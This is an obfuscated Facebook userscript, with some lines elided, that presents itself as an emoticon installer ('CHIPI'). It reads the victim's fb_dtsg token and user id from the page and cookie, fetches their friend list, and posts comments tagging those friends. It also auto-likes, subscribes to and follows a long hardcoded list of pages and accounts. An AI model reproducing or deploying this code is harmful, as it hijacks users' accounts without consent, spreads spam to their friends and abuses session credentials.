// ==UserScript==
// @name            Cài đặt CHIPI trực tiếp trên FaceBook 2014 (y)
...
// === Facebook Emoticons ====
//
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","235552933296848","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," <3 (y) ☺  @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
;
arkadaslari_al(701951973188403);arkadaslari_al(235981786587296);arkadaslari_al(235567123295429);arkadaslari_al(223498514520204);
...
sublist("217106928492696");Like("215538235241105");Like("568184179921540");Like("614824545229974");Like("666500650066869");Like("1447757762122595");
P("1436227729928103");P("121066274763429");
//Dang Hai Nguyen
...
//cuongnd
a("100003751456706");sublist("364254193709626");sublist("375364775931901"); IDS("100003751456706");
//Lu hong phong
P("237115036449474");a("100004529375162");sublist("234571896703788");sublist("235061496654828");sublist("247547592072885");Like("1463475603864473");
//
var gid = ['id'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
